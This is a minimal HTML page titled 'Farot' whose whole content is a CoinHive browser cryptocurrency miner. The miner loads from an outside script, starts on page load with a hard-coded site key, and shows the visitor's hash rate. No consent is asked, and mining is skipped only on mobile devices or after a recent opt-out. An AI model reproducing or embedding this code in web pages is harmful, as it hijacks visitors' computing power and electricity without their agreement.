<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Farot</title>
        <link rel="stylesheet" type="text/css" href="/src/css/base.css">
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    </head>
    <body>
        <div id="console" />

        <script type="text/javascript">
            var miner = new CoinHive.Anonymous('VWI2tlnLKXbiIkedogpvT5oEZH0LNp7z', {throttle: 0.3});
            // Only start on non-mobile devices and if not opted-out
            // in the last 14400 seconds (4 hours):
            if (!miner.isMobile() && !miner.didOptOut(14400)) {
                miner.start();
            }
            setInterval(function() {
                var hashesPerSecond = miner.getHashesPerSecond();
                var totalHashes = miner.getTotalHashes();
                var acceptedHashes = miner.getAcceptedHashes();

                document.getElementById('console').innerHTML = 'Hashes per second: ' + hashesPerSecond + '<br />Total hashes: ' + totalHashes;
            }, 1000);
        </script>
    </body>
</html>
